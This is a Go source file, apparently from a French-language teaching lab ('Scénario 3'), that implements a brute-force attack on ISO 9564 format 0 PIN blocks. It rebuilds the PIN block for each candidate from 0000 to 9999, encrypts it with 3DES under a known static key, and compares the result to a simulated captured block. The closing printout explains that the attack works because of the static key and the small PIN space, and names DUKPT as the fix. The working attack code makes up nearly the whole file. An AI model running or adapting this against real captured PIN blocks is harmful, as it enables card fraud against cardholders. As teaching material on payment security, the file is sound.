// Scénario 3 : PIN Cracker
// EXPLOIT : Brute force d'un PIN Block avec clé statique
//
// ⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT
//
// Compilation: go build pin-cracker.go
// Usage: ./pin-cracker

package main

import (
	"crypto/cipher"
	"crypto/des"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
)

// Configuration de l'attaque
type AttackConfig struct {
	PinBlockHex string // PIN Block chiffré (hex)
	KeyHex      string // Clé de chiffrement (hex)
	PAN         string // PAN pour reconstruire le PIN Block
	MaxPin      int    // PIN maximum à tester
}

// Résultat de l'attaque
type AttackResult struct {
	Found    bool
	PIN      string
	Attempts int
	Duration time.Duration
}

// Décrypte un PIN Block avec 3DES
func decrypt3DES(ciphertext, key []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, make([]byte, 8)) // IV = 0
	mode.CryptBlocks(plaintext, ciphertext)

	return plaintext, nil
}

// Génère un PIN Block Format 0 (ISO 9564-1)
func generatePinBlock0(pin, pan string) []byte {
	// Block 1: 0 + longueur PIN + PIN + padding F
	pinLen := len(pin)
	block1 := fmt.Sprintf("0%d%s", pinLen, pin)
	for len(block1) < 16 {
		block1 += "F"
	}

	// Block 2: 0000 + 12 derniers chiffres du PAN (sans check digit)
	panDigits := pan[len(pan)-13 : len(pan)-1]
	block2 := "0000" + panDigits

	// XOR des deux blocs
	result := make([]byte, 8)
	block1Bytes, _ := hex.DecodeString(block1)
	block2Bytes, _ := hex.DecodeString(block2)

	for i := 0; i < 8; i++ {
		result[i] = block1Bytes[i] ^ block2Bytes[i]
	}

	return result
}

// Encrypts un PIN Block avec 3DES
func encrypt3DES(plaintext, key []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, make([]byte, 8)) // IV = 0
	mode.CryptBlocks(ciphertext, plaintext)

	return ciphertext, nil
}

// Brute force le PIN
func bruteForce(config AttackConfig) AttackResult {
	start := time.Now()

	targetBytes, _ := hex.DecodeString(config.PinBlockHex)
	keyBytes, _ := hex.DecodeString(config.KeyHex)

	// Étendre la clé à 24 bytes pour 3DES
	if len(keyBytes) == 16 {
		keyBytes = append(keyBytes, keyBytes[:8]...)
	}

	for pin := 0; pin <= config.MaxPin; pin++ {
		pinStr := fmt.Sprintf("%04d", pin)

		// Générer le PIN Block pour ce PIN
		pinBlock := generatePinBlock0(pinStr, config.PAN)

		// Chiffrer
		encrypted, err := encrypt3DES(pinBlock, keyBytes)
		if err != nil {
			continue
		}

		// Comparer
		if hex.EncodeToString(encrypted) == strings.ToLower(config.PinBlockHex) {
			return AttackResult{
				Found:    true,
				PIN:      pinStr,
				Attempts: pin + 1,
				Duration: time.Since(start),
			}
		}
	}

	return AttackResult{
		Found:    false,
		Attempts: config.MaxPin + 1,
		Duration: time.Since(start),
	}
}

func main() {
	fmt.Println(strings.Repeat("═", 60))
	fmt.Println("  💀 PIN CRACKER - Scénario 3")
	fmt.Println("  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE")
	fmt.Println(strings.Repeat("═", 60))

	// Simuler un PIN Block capturé
	// (En réalité créé avec PIN=1234, PAN=4111111111111111)
	testPAN := "4111111111111111"
	testPIN := "1234"
	testKey := "0123456789ABCDEFFEDCBA9876543210"

	// Générer le PIN Block pour la simulation
	keyBytes, _ := hex.DecodeString(testKey)
	if len(keyBytes) == 16 {
		keyBytes = append(keyBytes, keyBytes[:8]...)
	}

	pinBlock := generatePinBlock0(testPIN, testPAN)
	encryptedBlock, _ := encrypt3DES(pinBlock, keyBytes)
	capturedPinBlock := hex.EncodeToString(encryptedBlock)

	fmt.Println("\n📥 Données capturées:")
	fmt.Printf("   PIN Block chiffré: %s\n", strings.ToUpper(capturedPinBlock))
	fmt.Printf("   PAN (connu):       ****%s\n", testPAN[len(testPAN)-4:])
	fmt.Printf("   Clé (statique):    %s\n", testKey[:16]+"...")

	fmt.Println("\n🔓 Lancement du brute force...")
	fmt.Println("   Testant 10000 combinaisons (0000-9999)...")

	config := AttackConfig{
		PinBlockHex: capturedPinBlock,
		KeyHex:      testKey,
		PAN:         testPAN,
		MaxPin:      9999,
	}

	result := bruteForce(config)

	fmt.Println()
	if result.Found {
		fmt.Println(strings.Repeat("═", 60))
		fmt.Println("  ✅ PIN TROUVÉ!")
		fmt.Println(strings.Repeat("═", 60))
		fmt.Printf("   PIN:        %s\n", result.PIN)
		fmt.Printf("   Tentatives: %d\n", result.Attempts)
		fmt.Printf("   Durée:      %v\n", result.Duration)
	} else {
		fmt.Println("  ❌ PIN non trouvé (limite atteinte)")
	}

	fmt.Println("\n" + strings.Repeat("─", 60))
	fmt.Println("  💡 POURQUOI CETTE ATTAQUE FONCTIONNE:")
	fmt.Println(strings.Repeat("─", 60))
	fmt.Println(`
  1. La clé de chiffrement est STATIQUE (jamais changée)
  2. L'espace des PIN est PETIT (seulement 10000 combinaisons)
  3. L'attaquant peut tester HORS LIGNE (pas de verrouillage)
  
  SOLUTION: Utiliser DUKPT (Derived Unique Key Per Transaction)
  `)
	fmt.Println(strings.Repeat("═", 60))
}
